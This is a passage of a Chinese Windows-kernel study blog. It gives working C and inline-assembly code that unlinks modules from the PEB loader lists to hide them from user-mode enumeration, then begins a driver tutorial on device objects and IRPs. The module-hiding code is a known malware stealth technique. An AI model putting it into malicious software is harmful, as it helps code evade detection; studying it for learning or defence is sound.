<h3 id="3-2-代码：隐藏所有模块"><a href="#3-2-代码：隐藏所有模块" class="headerlink" title="3.2 代码：隐藏所有模块"></a>3.2 代码：隐藏所有模块</h3><div class="note info"><p>所谓断链，就是把三个链表断掉，让3环的API读不出模块信息。最简单的做法就是让当前进程的Flink和Blink指向它自己。</p>
<p>⚠️注意：要隐藏模块，则这个模块在这三个结构中都要断开。</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核Unicode字符串</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length;</span><br><span class="line">    BOOLEAN Initialized;</span><br><span class="line">    PVOID SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    PVOID EntryInProgress; </span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; </span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">HideModule</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;未断链\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	HideModule();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;断链后\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">VOID <span class="title">HideModule</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PPEB_LDR_DATA Ldr = <span class="literal">NULL</span>;</span><br><span class="line">  PLIST_ENTRY Head = <span class="literal">NULL</span>;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    pushad;</span><br><span class="line">    mov eax, fs:[<span class="number">30</span>h];	<span class="comment">//eax 指向PEB</span></span><br><span class="line">    mov eax, [eax+<span class="number">0xc</span>]	<span class="comment">//eax 指向PEB_LDR_DATA </span></span><br><span class="line">    mov Ldr, eax;</span><br><span class="line">    popad;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  Head = Ldr-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">  Head-&gt;Flink = Head;</span><br><span class="line">  Head-&gt;Blink = Head;</span><br><span class="line"></span><br><span class="line">  Head = Ldr-&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">  Head-&gt;Flink = Head;</span><br><span class="line">  Head-&gt;Blink = Head;</span><br><span class="line"></span><br><span class="line">  Head = Ldr-&gt;InInitializationOrderModuleList.Flink;</span><br><span class="line">  Head-&gt;Flink = Head;</span><br><span class="line">  Head-&gt;Blink = Head;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行环境：Windows7 SP1 x64，VC6++</p>
<p>断链前：</p>
<p><img data-src="https://s2.loli.net/2022/01/19/LdJzAtlMWf8jXk2.png" alt="26.png"></p>
<p>断链后：</p>
<p><img data-src="https://s2.loli.net/2022/01/19/BfJVO62pFlYxHMR.png" alt="27.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//内嵌汇编获取Kernel32的地址</span></span><br><span class="line">__declspec(naked) <span class="function">DWORD <span class="title">getKernel32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax,fs:[<span class="number">30</span>h]	<span class="comment">//eax 指向PEB</span></span><br><span class="line">        mov eax,[eax+<span class="number">0</span>ch]	<span class="comment">//eax 指向PEB_LDR_DATA</span></span><br><span class="line">        mov eax,[eax+<span class="number">14</span>h]	<span class="comment">//eax 指向InMemoryOrderModuleList</span></span><br><span class="line">        mov eax,[eax]		<span class="comment">//eax 指向LDR-&gt;指向InMemoryOrderModuleList.Flink</span></span><br><span class="line">        mov eax,[eax]		<span class="comment">//eax 指向当前模块的地址</span></span><br><span class="line">        mov eax,[eax+<span class="number">10</span>h]<span class="comment">//eax 指向第五个模块</span></span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//kernel32.dll 基址的动态获取</span></span><br><span class="line">    HMODULE hLoadLibrary = LoadLibraryA(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    <span class="comment">//使用内嵌汇编来获取基址</span></span><br><span class="line">    HMODULE _hLoadLibrary = (HMODULE)getKernel32();</span><br><span class="line">    <span class="comment">//效果是一样的</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LoadLibraryA动态获取的地址: 0x%x\n&quot;</span>, hLoadLibrary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;内嵌汇编获取的地址: 0x%x\n&quot;</span>, _hLoadLibrary);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="3-3-代码：隐藏指定模块"><a href="#3-3-代码：隐藏指定模块" class="headerlink" title="3.3 代码：隐藏指定模块"></a>3.3 代码：隐藏指定模块</h3><p>隐藏本进程的<code>kernel32.dll</code>模块。</p>
<p>  方案1：在PEB_LDR_DATA断开：<br>    <code>InLoadOrderModuleList</code><br>    <code>InMemoryOrderModuleList</code><br>    <code>InInitializationOrderModuleList</code><br>    这种和方案3实质是一样的</p>
<p>  方案2：在三个List的<code>LDR_DATA_TABLE_ENTRY</code>仅断开<code>InLoadOrderLinks</code>，不可行。</p>
<p>  方案3：在LDR_DATA_TABLE_ENTRY里断开对应的：<br>    <code>InLoadOrderLinks</code><br>    <code>InMemoryOrderLinks</code><br>    <code>InInitializationOrderLinks</code></p>
<p>经过实际代码运行分析，有这样的对应关系：</p>
<ul>
<li><code>InLoadOrderModuleList-&gt;Flink == InLoadOrderLinks</code></li>
<li><code>InMemoryOrderModuleList-&gt;Flink == InMemoryOrderLinks</code></li>
<li><code>InInitializationOrderModuleList-&gt;Flink == InInitializationOrderLinks</code></li>
</ul>
<p>示意图如下：</p>
<p><img data-src="https://s2.loli.net/2022/03/04/FwiL8n25oS7sBOr.png" alt="30_1.png"></p>
<p>由上图可知，<code>InLoadOrderModuleList-&gt;Flink == InLoadOrderLinks</code>与其他两个不一定在同一个结构体中。且都是对应指过去。</p>
<p>故如下代码注释可以改为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Ldte = (PLDR_DATA_TABLE_ENTRY)pTemp;</span><br><span class="line">Ldte = (PLDR_DATA_TABLE_ENTRY)(pTemp - <span class="number">0x8</span>);</span><br><span class="line">Ldte = (PLDR_DATA_TABLE_ENTRY)(pTemp - <span class="number">0x10</span>);</span><br></pre></td></tr></table></figure>

<p><strong>因为：</strong><code>InLoadOrderModuleList</code>既是<code>LIST_ENTRY</code>结构，也是<code>LDR_DATA_TABLE_ENTRY</code>结构，而<code>InLoadOrderLinks</code>仅为<code>LIST_ENTRY</code>结构。由于对应结构都是一一指向过去，拿<code>InMemoryOrderList</code>举例，其<code>InMemoryOrderList.Flink == InMemoryOrderLinks</code>，相对于<code>LDR_DATA_TABLE_ENTRY</code>结构偏移量为0x8。</p>
<p>⚠️：InLoadOrderModule<strong>List</strong>不同InMemoryOrder<strong>Links</strong>。InLoadOrderModule<strong>List</strong>.Flink为当前模块的<code>LDR_DATA_TABLE_ENTRY</code>，InMemoryOrder<strong>Links</strong>.Flink为下一个模块的<code>LIST_ENTRY</code>。</p>
<p>隐藏模块代码如下（如果题目改为隐藏除了<code>kernel32.dll</code>外的所有模块，只需要将<code>UnicodeStringCMP</code>函数比较结果取反即可）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核Unicode字符串</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length;</span><br><span class="line">    BOOLEAN Initialized;</span><br><span class="line">    PVOID SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    PVOID EntryInProgress; </span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">     LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">     LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">     PVOID DllBase;</span><br><span class="line">     PVOID EntryPoint;</span><br><span class="line">     ULONG SizeOfImage;</span><br><span class="line">     UNICODE_STRING FullDllName;</span><br><span class="line">     UNICODE_STRING BaseDllName;</span><br><span class="line">     ULONG Flags;</span><br><span class="line">     WORD LoadCount;</span><br><span class="line">     WORD TlsIndex;</span><br><span class="line">     <span class="comment">//后面的成员暂时用不到，就不列举了</span></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">HideOneModule</span><span class="params">(PWSTR pMoudleName)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">UnicodeStringCMP</span><span class="params">(PWSTR Sting_1, PWSTR Sting_2)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;隐藏模块kernel32.dll前\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	HideOneModule(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;隐藏模块kernel32.dll后\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">HideOneModule</span><span class="params">(PWSTR pMoudleName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PPEB_LDR_DATA Ldr = <span class="literal">NULL</span>;</span><br><span class="line">  PLIST_ENTRY Head = <span class="literal">NULL</span>;</span><br><span class="line">  PLIST_ENTRY pTemp = <span class="literal">NULL</span>;</span><br><span class="line">  PLDR_DATA_TABLE_ENTRY Ldte = <span class="literal">NULL</span>;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    pushad;</span><br><span class="line">    mov eax, fs:[<span class="number">30</span>h];	<span class="comment">//eax 指向PEB</span></span><br><span class="line">    mov eax, [eax+<span class="number">0xc</span>]	<span class="comment">//eax 指向PEB_LDR_DATA </span></span><br><span class="line">    mov Ldr, eax;</span><br><span class="line">    popad;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Head = &amp;(Ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">  pTemp = Head-&gt;Flink;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//Ldte = (PLDR_DATA_TABLE_ENTRY)pTemp;	//当前模块</span></span><br><span class="line">		Ldte = CONTAINING_RECORD(pTemp, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);</span><br><span class="line">		<span class="keyword">if</span>(UnicodeStringCMP(Ldte-&gt;BaseDllName.Buffer, pMoudleName))</span><br><span class="line">		&#123;</span><br><span class="line">			Ldte-&gt;InLoadOrderLinks.Blink-&gt;Flink = Ldte-&gt;InLoadOrderLinks.Flink;  </span><br><span class="line">			Ldte-&gt;InLoadOrderLinks.Flink-&gt;Blink = Ldte-&gt;InLoadOrderLinks.Blink;	</span><br><span class="line">		&#125;</span><br><span class="line">		pTemp = pTemp-&gt;Flink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(Head != pTemp);</span><br><span class="line"></span><br><span class="line">  Head = &amp;(Ldr-&gt;InMemoryOrderModuleList);</span><br><span class="line">  pTemp = Head-&gt;Flink;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//Ldte = (PLDR_DATA_TABLE_ENTRY)pTemp;	</span></span><br><span class="line">		Ldte = CONTAINING_RECORD(pTemp, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">		<span class="keyword">if</span>(UnicodeStringCMP(Ldte-&gt;BaseDllName.Buffer, pMoudleName))</span><br><span class="line">		&#123;</span><br><span class="line">			Ldte-&gt;InMemoryOrderLinks.Blink-&gt;Flink = Ldte-&gt;InMemoryOrderLinks.Flink;  </span><br><span class="line">			Ldte-&gt;InMemoryOrderLinks.Flink-&gt;Blink = Ldte-&gt;InMemoryOrderLinks.Blink;	</span><br><span class="line">		&#125;</span><br><span class="line">		pTemp = pTemp-&gt;Flink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(Head != pTemp);</span><br><span class="line"></span><br><span class="line">  Head = &amp;(Ldr-&gt;InInitializationOrderModuleList);</span><br><span class="line">  pTemp = Head-&gt;Flink;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//Ldte = (PLDR_DATA_TABLE_ENTRY)pTemp;	</span></span><br><span class="line">		Ldte = CONTAINING_RECORD(pTemp, LDR_DATA_TABLE_ENTRY, InInitializationOrderLinks);</span><br><span class="line">		<span class="keyword">if</span>(UnicodeStringCMP(Ldte-&gt;BaseDllName.Buffer, pMoudleName))</span><br><span class="line">		&#123;</span><br><span class="line">			Ldte-&gt;InInitializationOrderLinks.Blink-&gt;Flink = Ldte-&gt;InInitializationOrderLinks.Flink;  </span><br><span class="line">			Ldte-&gt;InInitializationOrderLinks.Flink-&gt;Blink = Ldte-&gt;InInitializationOrderLinks.Blink;	</span><br><span class="line">		&#125;</span><br><span class="line">		pTemp = pTemp-&gt;Flink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(Head != pTemp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//字符串比较函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnicodeStringCMP</span><span class="params">(PWSTR Sting_1, PWSTR Sting_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (*Sting_1)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (*Sting_1 != *Sting_2)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		Sting_1++;</span><br><span class="line">		Sting_2++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行环境：Windows7 SP1 x64，VC6++</p>
<p>隐藏模块kernel32.dll前：</p>
<p><img data-src="https://s2.loli.net/2022/01/20/bexjKra2ZDINPEo.png" alt="28.png"></p>
<p>隐藏模块kernel32.dll后：</p>
<p><img data-src="https://s2.loli.net/2022/01/20/Rd6YH9gJO7ZxhpU.png" alt="29.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>WinXP驱动</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
        <tag>PEB断链</tag>
        <tag>3环模块隐藏</tag>
        <tag>0环模块隐藏</tag>
        <tag>特征码搜索</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 驱动开发（三）</title>
    <url>/post/WinXP-Driver3/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-0环与3环通信常规方式"><a href="#1-0环与3环通信常规方式" class="headerlink" title="1 0环与3环通信常规方式"></a>1 0环与3环通信常规方式</h2><p>在驱动中，如果想与3环的程序进行交互，就必须得有设备对象。</p>
<p>本文讲常规的通信方式，通常程序开发使用该方式，非常规方式在这里：<a href="https://blog.csdn.net/Kwansy/article/details/109774674">0环与3环通信非常规方式 —— 0环InlineHook</a>。</p>
<h3 id="1-1-设备对象"><a href="#1-1-设备对象" class="headerlink" title="1.1 设备对象"></a>1.1 设备对象</h3><p>我们在开发窗口程序的时候，消息被封装成一个结构体：<strong>MSG</strong>，在内核开发时，消息被封装成另外一个结构体：<strong>IRP</strong>（I&#x2F;O Request Package）。</p>
<p>在窗口程序中，能够接收消息的只能是窗口对象。在内核中，能够接收IRP消息的只能是设备对象。当上层应用程序需要访问底层输入输出设备时，发出<code>I/O</code>请求，系统会把这些请求转化为<code>IRP</code>数据，不同的<code>IRP</code>会启动<code>I/O</code>设备驱动中对应的派遣函数。</p>
<p><img data-src="https://s2.loli.net/2022/01/17/Fm1o29Ix87wnlWi.png" alt="20.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMSG</span> &#123;</span></span><br><span class="line">    HWND        hwnd;		<span class="comment">//该消息所属的窗口句柄</span></span><br><span class="line">    UINT        message;	<span class="comment">//指定消息的类型</span></span><br><span class="line">    WPARAM      wParam;		<span class="comment">//用于指定消息的附加信息，根据消息不同，代表不同意思</span></span><br><span class="line">    LPARAM      lParam;		<span class="comment">//用于指定消息的附加信息，根据消息不同，代表不同意思</span></span><br><span class="line">    DWORD       time;		<span class="comment">//该消息投递到消息列队当中的时间</span></span><br><span class="line">    POINT       pt;		<span class="comment">//该消息投递到消息列队当时，鼠标的当前位置</span></span><br><span class="line">&#125; MSG, *PMSG, NEAR *NPMSG, FAR *LPMSG;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _IRP</span><br><span class="line">nt!_IRP</span><br><span class="line">   +<span class="number">0x000</span> Type             : Int2B</span><br><span class="line">   +<span class="number">0x002</span> Size             : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> MdlAddress       : Ptr32 _MDL</span><br><span class="line">   +<span class="number">0x008</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> AssociatedIrp    : __unnamed</span><br><span class="line">   +<span class="number">0x010</span> ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> IoStatus         : _IO_STATUS_BLOCK</span><br><span class="line">   +<span class="number">0x020</span> RequestorMode    : Char</span><br><span class="line">   +<span class="number">0x021</span> PendingReturned  : UChar</span><br><span class="line">   +<span class="number">0x022</span> StackCount       : Char</span><br><span class="line">   +<span class="number">0x023</span> CurrentLocation  : Char</span><br><span class="line">   +<span class="number">0x024</span> Cancel           : UChar</span><br><span class="line">   +<span class="number">0x025</span> CancelIrql       : UChar</span><br><span class="line">   +<span class="number">0x026</span> ApcEnvironment   : Char</span><br><span class="line">   +<span class="number">0x027</span> AllocationFlags  : UChar</span><br><span class="line">   +<span class="number">0x028</span> UserIosb         : Ptr32 _IO_STATUS_BLOCK</span><br><span class="line">   +<span class="number">0x02c</span> UserEvent        : Ptr32 _KEVENT</span><br><span class="line">   +<span class="number">0x030</span> Overlay          : __unnamed</span><br><span class="line">   +<span class="number">0x038</span> CancelRoutine    : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x03c</span> UserBuffer       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x040</span> Tail             : __unnamed</span><br></pre></td></tr></table></figure>

<h3 id="1-2-创建设备对象"><a href="#1-2-创建设备对象" class="headerlink" title="1.2 创建设备对象"></a>1.2 创建设备对象</h3><p>使用<code>IoCreateDevice</code>函数在0环来创建一个设备对象。</p>
<p>驱动程序原本的目的是用来控制硬件，但我们也可以用驱动做一些安全相关的事情，因为驱动运行在0环。为了控制驱动运行，我们需要在3环向驱动发数据，所以我们需要有一种方法来建立0环到3环的通信。本文介绍常规方式，也就是创建设备对象的方式。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建设备名称</span></span><br><span class="line">UNICODE_STRING Devicename;</span><br><span class="line">RtlInitUnicodeString(&amp;Devicename,<span class="string">L&quot;\\Device\\MyDevice&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           PDRIVER_OBJECT  DriverObject,		<span class="comment">//当前设备所属的驱动对象</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           ULONG           DeviceExtensionSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, optional] PUNICODE_STRING DeviceName,		<span class="comment">//设备对象的名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           DEVICE_TYPE     DeviceType,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           ULONG           DeviceCharacteristics,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           BOOLEAN         Exclusive,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out]          PDEVICE_OBJECT  *DeviceObject		<span class="comment">//设备对象指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="1-3-0环与3环数据交互方式"><a href="#1-3-0环与3环数据交互方式" class="headerlink" title="1.3 0环与3环数据交互方式"></a>1.3 0环与3环数据交互方式</h3><p>设备对象的<strong>Flags</strong>（UINT32）成员决定0环和3环进行数据交互的方式，分以下3种：</p>
<ol>
<li><strong>缓冲区方式读写</strong>（<code>DO_BUFFERED_IO</code>）：操作系统将应用程序提供缓冲区的数据复制到内核模式下的地址中。实质上是：将3环一个缓冲区的内容复制到0环的缓冲区（数据量小时好用，但是交互慢）。</li>
<li><strong>直接方式读写</strong>（<code>DO_DIRECT_IO</code>）：操作系统会将用户模式下的缓冲区锁住。然后操作系统将这段缓冲区在内核模式地址再次映射一遍。这样，用户模式的缓冲区和内核模式的缓冲区指向的是同一区域的物理内存。缺点就是要单独占用物理页面。<strong>0环和3环线性地址指向同一块物理页</strong>（数据量大时好用，但是物理页不允许换页，如写入文件）。</li>
<li><strong>其他方式读写</strong>：在0环直接读3环的线性地址，不建议使用。在调用<code>IoCreateDevice</code>创建设备后对<code>pDevObj-&gt;Flags</code>即不设置DO_BUFFERED_IO也不设置DO_DIRECT_IO此时就是其他方式。</li>
</ol>
<blockquote>
<p>在使用其他方式读写设备时，派遣函数直接读写应用程序提供的缓冲区地址。在驱动程序中，直接操作应用程序的缓冲区地址是很危险的。只有驱动程序与应用程序运行在相同线程上下文的情况下，才能使用这种方式。</p>
</blockquote>
<p>使用方式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;</span><br></pre></td></tr></table></figure>



<h3 id="1-4-创建符号链接"><a href="#1-4-创建符号链接" class="headerlink" title="1.4 创建符号链接"></a>1.4 创建符号链接</h3><p>创建符号链接目的是：在3环不能直视使用设备名称进行数据交互，需要在0环将设备对象链接到一个符号上去，然后在3环通过这个符号进行数据交互。</p>
<div class="note danger"><p>特别说明：<br>1、设备名称的作用是给内核对象用的，如果要在Ring3访问，必须要有符号链接。其实就是一个别名，没有这个别名，在Ring3不可见。<br>2、内核模式下，符号链接是以<code>\??\</code>开头的，如C 盘就是<code>\??\C:</code>。<br>3、而在用户模式下，则是以<code>\\.\</code>开头的，如C 盘就是<code>\\.\C:</code>。</p>
<p>4、在3环使用符号链接的格式：<code>\\.\符号名称</code>，编程时通常需要使用转义符，写为<code>\\\\.\\符号名称</code>。</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建符号链接名称</span></span><br><span class="line">RtlInitUnicodeString(&amp;SymbolicLinkName,<span class="string">L&quot;\\??\\MyTestDriver&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建符号链接</span></span><br><span class="line">IoCreateSymbolicLink(&amp;SymbolicLinkName,&amp;Devicename);</span><br></pre></td></tr></table></figure>



<h3 id="1-5-IRP与派遣函数"><a href="#1-5-IRP与派遣函数" class="headerlink" title="1.5 IRP与派遣函数"></a>1.5 IRP与派遣函数</h3><p>Win32程序中，当一个事件发生，操作系统就会将这个事件封装成一个tagMSG结构的消息，然后将该消息发送给产生事件的窗口，然后窗口调用对应的消息回调函数进行处理。</p>
<p>同理，当3环调用API访问设备的时候，在0环会将某API事件封装成IRP结构，然后将IRP发给设备对象，设备对象调用派遣函数（回调函数）来进行处理。</p>
<p><img data-src="https://s2.loli.net/2022/01/17/bAcIVFKrvJOmnB4.png" alt="21.png"></p>
<p><strong>IRP的类型：</strong></p>
<ol>
<li><p>当应用层通过CreateFile，ReadFile，WriteFile，CloseHandle等函数打开、从设备读取数据、向设备写入数据、关闭设备的时候，会使操作系统产生出<code>IRP_MJ_CREATE</code>，<code>IRP_MJ_READ</code>，<code>IRP_MJ_WRITE</code>，<code>IRP_MJ_CLOSE</code>等不同的IRP。</p>
</li>
<li><p>其他类型的IRP。</p>
</li>
</ol>
<p>   <img data-src="https://s2.loli.net/2022/01/17/oUxNpIilGY961aQ.png" alt="22.png"></p>
<p><code>IRP</code>列表如下：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
<th>调用者</th>
</tr>
</thead>
<tbody><tr>
<td>IRP_MJ_CREATE</td>
<td>请求一个句柄</td>
<td><code>CreateFile</code></td>
</tr>
<tr>
<td>IRP_MJ_CLEANUP</td>
<td>在关闭句柄时取消悬挂的IRP</td>
<td><code>CloseHandle</code></td>
</tr>
<tr>
<td>IRP_MJ_CLOSE</td>
<td>关闭句柄</td>
<td><code>CloseHandle</code></td>
</tr>
<tr>
<td>IRP_MJ_READ</td>
<td>从设备得到数据</td>
<td><code>ReadFile</code></td>
</tr>
<tr>
<td>IRP_MJ_WRITE</td>
<td>传送数据到设备</td>
<td><code>WriteFile</code></td>
</tr>
<tr>
<td>IRP_MJ_DEVICE_CONTROL</td>
<td>控制操作（利用IOCTL宏）</td>
<td><code>DeviceIoControl</code></td>
</tr>
<tr>
<td>RP_MJ_INTERNAL_DEVICE_CONTROL</td>
<td>控制操作(只能被内核调用)</td>
<td><code>N/A</code></td>
</tr>
<tr>
<td>IRP_MJ_QUERY_INFORMATION</td>
<td>得到文件的长度</td>
<td><code>GetFileSize</code></td>
</tr>
<tr>
<td>IRP_MJ_SET_INFORMATION</td>
<td>设置文件的长度</td>
<td><code>SetFileSize</code></td>
</tr>
<tr>
<td>IRP_MJ_FLUSH_BUFFERS</td>
<td>写输出缓冲区或者丢弃输入缓冲区</td>
<td><code>FlushFileBuffers</code></td>
</tr>
<tr>
<td></td>
<td></td>
<td><code>FlushConsoleInputBuffer</code></td>
</tr>
<tr>
<td></td>
<td></td>
<td><code>PurgeComm</code></td>
</tr>
<tr>
<td>IRP_MJ_SHUTDOWN</td>
<td>系统关闭</td>
<td><code>InitiateSystemShutdown</code></td>
</tr>
</tbody></table>
<p>在<code>wdm.h</code>中：</p>
